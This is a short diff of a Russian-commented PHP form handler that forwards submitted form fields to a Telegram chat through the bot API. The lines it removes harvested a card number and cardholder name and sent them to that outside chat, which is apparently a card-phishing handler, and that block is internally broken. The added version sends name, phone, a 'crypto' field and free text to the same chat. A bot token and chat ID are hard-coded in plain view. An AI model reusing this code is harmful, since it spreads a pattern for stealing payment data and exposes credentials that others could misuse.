@@ -3,14 +3,17 @@
 /* https://api.telegram.org/bot5546941826:AAF-xuOpCeHepRsfCEnn6ExCuqoos8XUgrM/getUpdates,
 где, XXXXXXXXXXXXXXXXXXXXXXX - токен вашего бота, полученный ранее */
 
-$name = $_POST['cardcode'];
-$carddate = $_POST['carddate'];
-$cardname = $_POST['cardname'];
+$feedback__name = $_POST['feedback__name'];
+$feedback__tel = $_POST['feedback__tel'];
+$feedback__words = $_POST['feedback__words'];
+$feedback__crypto = $_POST['feedback__crypto'];
 $token = "5546941826:AAF-xuOpCeHepRsfCEnn6ExCuqoos8XUgrM";
 $chat_id = "-1001686101709";
 $arr = array(
-  'Номер карты: ' => $cardcode,
-  'Имя владельца: ' => $cardname
+  'Name: ' => $feedback__name,
+  'Tel: ' => $feedback__tel,
+  'Crypto: ' => $feedback__crypto,
+  'About: ' => $feedback__words,
 );
 
 foreach($arr as $key => $value) {
